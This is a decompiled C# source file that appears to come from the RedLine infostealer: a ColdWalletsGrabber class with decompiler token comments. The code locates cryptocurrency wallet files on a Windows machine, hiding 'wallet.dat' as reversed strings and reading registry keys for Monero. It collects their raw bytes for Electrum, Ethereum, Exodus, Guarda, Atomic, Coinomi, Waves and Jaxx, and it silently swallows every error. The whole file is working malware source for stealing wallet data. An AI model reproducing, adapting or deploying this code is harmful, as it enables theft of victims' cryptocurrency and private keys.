using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using RedLine.Client.Models;
using RedLine.Logic.Helpers;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x0200003D RID: 61
	public static class ColdWalletsGrabber
	{
		// Token: 0x06000191 RID: 401 RVA: 0x00004A38 File Offset: 0x00002C38
		public static IList<ColdWallet> ParseFiles()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				List<string> list2 = DecryptHelper.FindPaths(Constants.RoamingAppData, 2, 1, new string[]
				{
					new string("tad.tellaw".Reverse<char>().ToArray<char>()),
					new string("tellaw".Reverse<char>().ToArray<char>())
				});
				list2.AddRange(DecryptHelper.FindPaths(Constants.LocalAppData, 2, 1, new string[]
				{
					new string("tad.tellaw".Reverse<char>().ToArray<char>()),
					new string("tellaw".Reverse<char>().ToArray<char>())
				}));
				foreach (string text in list2)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(text);
						list.Add(new ColdWallet
						{
							DataArray = File.ReadAllBytes(text),
							FileName = fileInfo.Name,
							WalletName = fileInfo.Directory.Name,
							WalletDir = fileInfo.Directory.Name
						});
					}
					catch
					{
					}
				}
				List<ColdWallet> list3 = new List<ColdWallet>();
				list3.AddRange(ColdWalletsGrabber.ParseElectrum());
				list3.AddRange(ColdWalletsGrabber.ParseEth());
				list3.AddRange(ColdWalletsGrabber.ParseExodus());
				list3.AddRange(ColdWalletsGrabber.ParseGuarda());
				list3.AddRange(ColdWalletsGrabber.ParseAtomic());
				list3.AddRange(ColdWalletsGrabber.ParseCoinomi());
				list3.AddRange(ColdWalletsGrabber.ParseWaves());
				list3.AddRange(ColdWalletsGrabber.ParseJaxx());
				ColdWallet item = ColdWalletsGrabber.ParseMonero();
				if (!string.IsNullOrWhiteSpace(item.FileName))
				{
					list.Add(item);
				}
				foreach (ColdWallet item2 in list3)
				{
					list.Add(item2);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x06000192 RID: 402 RVA: 0x00004C74 File Offset: 0x00002E74
		private static List<ColdWallet> ParseGuarda()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.EnumerateFiles("*.*", SearchOption.AllDirectories))
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Guarda",
									WalletDir = fileInfo.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty)
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000193 RID: 403 RVA: 0x00004D78 File Offset: 0x00002F78
		private static List<ColdWallet> ParseAtomic()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.EnumerateFiles("*.*", SearchOption.AllDirectories))
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Atomic",
									WalletDir = fileInfo.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic", "Atomic")
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000194 RID: 404 RVA: 0x00004E7C File Offset: 0x0000307C
		private static List<ColdWallet> ParseCoinomi()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Coinomi");
				DirectoryInfo directoryInfo2 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Coinomi\\wallet_db");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.EnumerateFiles("*.*", SearchOption.TopDirectoryOnly))
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Coinomi",
									WalletDir = "Coinomi"
								});
							}
						}
					}
				}
				if (directoryInfo2.Exists)
				{
					foreach (FileInfo fileInfo2 in directoryInfo2.EnumerateFiles("*.*", SearchOption.TopDirectoryOnly))
					{
						if (fileInfo2.Exists)
						{
							byte[] array2 = File.ReadAllBytes(fileInfo2.FullName);
							if (array2 != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array2,
									FileName = fileInfo2.Name,
									WalletName = "Coinomi",
									WalletDir = "Coinomi\\wallet_db"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000195 RID: 405 RVA: 0x0000503C File Offset: 0x0000323C
		private static List<ColdWallet> ParseWaves()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\waves-exchange");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.EnumerateFiles("*.*", SearchOption.AllDirectories))
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Waves",
									WalletDir = fileInfo.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\waves-exchange", "Waves")
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000196 RID: 406 RVA: 0x00005140 File Offset: 0x00003340
		private static List<ColdWallet> ParseJaxx()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.EnumerateFiles("*.*", SearchOption.AllDirectories))
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Jaxx",
									WalletDir = fileInfo.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx", "Jaxx")
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000197 RID: 407 RVA: 0x00005244 File Offset: 0x00003444
		private static List<ColdWallet> ParseEth()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Ethereum",
									WalletDir = "Ethereum\\wallets"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000198 RID: 408 RVA: 0x00005300 File Offset: 0x00003500
		private static List<ColdWallet> ParseElectrum()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									FileName = fileInfo.Name,
									WalletName = "Electrum",
									WalletDir = "Electrum\\wallets"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000199 RID: 409 RVA: 0x000053BC File Offset: 0x000035BC
		private static List<ColdWallet> ParseExodus()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								FileName = fileInfo.Name,
								WalletName = "Exodus",
								WalletDir = "Exodus\\exodus.wallet"
							});
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600019A RID: 410 RVA: 0x00005470 File Offset: 0x00003670
		private static ColdWallet ParseMonero()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("monero-project");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("monero-core") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					char[] separator = new char[]
					{
						'\\'
					};
					string text = (registryKey4 != null) ? registryKey4.GetValue("wallet_path").ToString().Replace("/", "\\") : null;
					if (File.Exists(text))
					{
						byte[] array = File.ReadAllBytes(text);
						if (array != null)
						{
							ColdWallet result = default(ColdWallet);
							result.DataArray = array;
							result.WalletName = "Monero";
							result.FileName = text.Split(separator)[text.Split(separator).Length - 1];
							result.WalletDir = "Monero";
							return result;
						}
					}
				}
			}
			catch
			{
			}
			return default(ColdWallet);
		}
	}
}
